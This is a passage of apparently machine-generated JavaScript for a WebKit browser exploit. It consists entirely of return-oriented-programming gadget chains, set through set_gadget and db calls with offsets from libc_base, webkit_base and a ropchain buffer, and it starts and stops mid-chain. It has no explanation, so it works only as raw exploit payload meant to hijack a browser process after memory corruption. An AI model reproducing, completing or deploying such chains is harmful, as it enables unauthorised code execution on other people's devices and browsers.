db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+282904, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+282920, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+282888, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+283024, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+283072, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+283040, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+283184, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+283176, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+283200, 
ropchain+283648, 
libc_base+50775, 
libc_base+793877, 
ropchain+283256, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+283424, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+283456, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+283440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+283408, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+283528, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+283544, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+283640, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+283624, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+283688, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967028, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+283792, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+283808, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+283960, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+283992, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+283976, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+283944, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+284088, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+284072, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+284176, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+284232, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967028, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+284312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+275568, 
libc_base+793877, 
ropchain+284408, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+284512, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+284528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+284648, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+284680, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+284632, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+284768, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+284784, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+284936, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+284968, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+284952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+284920, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+285064, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+285048, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+285168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+172824, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+285304, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+285320, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+285288, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+285424, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+285408, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967032, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967032, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+285568, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+285584, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+285736, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+285768, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+285752, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+285720, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+285840, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+285856, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+285952, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+285936, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([4294901760, 4294967295]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+286064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+5202439, 
libc_base+793877, 
ropchain+286200, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+286168, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+286304, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+286288, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+286384, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([32, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+286488, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+286504, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+286656, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+286688, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+286672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+286640, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+286760, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+286776, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+286936, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+286904, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+286888, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+287016, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+287032, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
libc_base+269973, 
libc_base+793877, 
ropchain+287192, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+287208, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+287176, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+287312, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+287360, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+287328, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+287472, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+287464, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+287488, 
ropchain+287504, 
libc_base+811575, 
ropchain+292832, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967024, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+287600, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+287656, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+287704, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967024, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+287808, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+287824, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+287976, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+288008, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+287992, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+287960, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+288080, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+288096, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+288192, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+288176, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+288272, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([32, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+288424, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+288440, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+288408, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+288608, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+288624, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+288592, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+288728, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+288776, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+288744, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+288888, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+288880, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+288904, 
ropchain+288920, 
libc_base+811575, 
ropchain+288936, 
libc_base+811575, 
ropchain+292816, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([51, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+289168, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+289272, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+289288, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+289408, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+289440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+289392, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+289528, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+289544, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+289688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+289656, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+289672, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+289760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+289816, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+289896, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967024, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+290000, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+290016, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+290168, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+290200, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+290184, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+290152, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+290360, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+290328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+290312, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+290432, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+290448, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+290536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+290592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+290712, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+290744, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+290728, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+290896, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+290928, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+290912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+290880, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+291000, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+291016, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+291112, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+291096, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+291216, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+294224, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+291352, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+291368, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+291336, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+291472, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+291520, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+291488, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+291632, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+291624, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+291648, 
ropchain+292096, 
libc_base+50775, 
libc_base+793877, 
ropchain+291704, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+291872, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+291904, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+291888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+291856, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+291976, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+291992, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+292088, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+292072, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+292136, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967024, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+292240, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+292256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+292408, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+292440, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+292424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+292392, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+292536, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+292520, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+292624, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+292680, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967024, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+292760, 
webkit_base+7438103, 
libc_base+882884, 
